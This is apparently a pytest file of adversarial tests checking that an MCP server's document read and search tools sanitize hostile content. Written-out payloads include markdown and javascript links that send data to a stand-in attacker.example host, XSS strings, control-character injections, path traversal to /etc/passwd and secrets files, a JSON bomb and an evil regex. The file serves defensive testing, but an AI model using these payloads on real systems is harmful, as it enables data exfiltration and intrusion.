"""Adversarial tests for the document read-side tools.

Plants hostile documents in the corpus and asserts the tools neutralize
exfiltration, injection, traversal, and denial-of-service vectors rather
than passing them through.
"""

import pytest
from fastmcp.exceptions import ToolError

from arrowhead.config import get_settings
from arrowhead.tools.doc_read import doc_read
from arrowhead.tools.doc_search import doc_search

MARKDOWN_EXFIL = [
    "![leak](http://attacker.example/?data=secret)",
    "[click](javascript:fetch('http://attacker.example'))",
    "<img src=x onerror=alert(1)>",
    "<script>steal()</script>",
]

TEXT_INJECTION = [
    "before\x1b[2J\x1b[31mANSI",
    "null\x00byte",
    "zero​width",
]

TRAVERSAL = [
    "../../etc/passwd.txt",
    "..\\..\\secrets.json",
    "/etc/hostname.txt",
]


@pytest.mark.parametrize("payload", MARKDOWN_EXFIL)
async def test_markdown_exfiltration_neutralized_on_read(docs, payload):
    (docs / "hostile.md").write_text(payload + "\n")
    result = await doc_read("hostile.md")
    assert "attacker.example" not in result["content"]
    assert "<script>" not in result["content"]
    assert "onerror" not in result["content"]


@pytest.mark.parametrize("payload", TEXT_INJECTION)
async def test_text_injection_stripped_on_read(docs, payload):
    (docs / "hostile.txt").write_text(payload)
    content = (await doc_read("hostile.txt"))["content"]
    assert "\x1b" not in content
    assert "\x00" not in content
    assert "​" not in content


@pytest.mark.parametrize("payload", TRAVERSAL)
async def test_traversal_refused_on_read(docs, payload):
    with pytest.raises(ToolError):
        await doc_read(payload)


async def test_json_bomb_refused_on_read(docs):
    (docs / "bomb.json").write_text("[" * 500 + "]" * 500)
    with pytest.raises(ToolError):
        await doc_read("bomb.json")


async def test_search_snippet_is_sanitized(docs):
    (docs / "hostile.md").write_text(
        "match ![x](http://attacker.example/?s=1) <script>go()</script>"
    )
    result = await doc_search("match")
    snippet = result["matches"][0]["snippet"]
    assert "attacker.example" not in snippet
    assert "<script>" not in snippet


async def test_catastrophic_regex_is_bounded(docs, monkeypatch):
    monkeypatch.setenv("ARROWHEAD_SEARCH_REGEX_ENABLED", "true")
    monkeypatch.setenv("ARROWHEAD_SEARCH_REGEX_TIMEOUT_MS", "100")
    get_settings.cache_clear()
    (docs / "target.txt").write_text("a" * 300 + "!")
    # Must return (possibly aborting the pattern), never hang.
    result = await doc_search(r"(a+)+$", use_regex=True)
    assert "match_count" in result
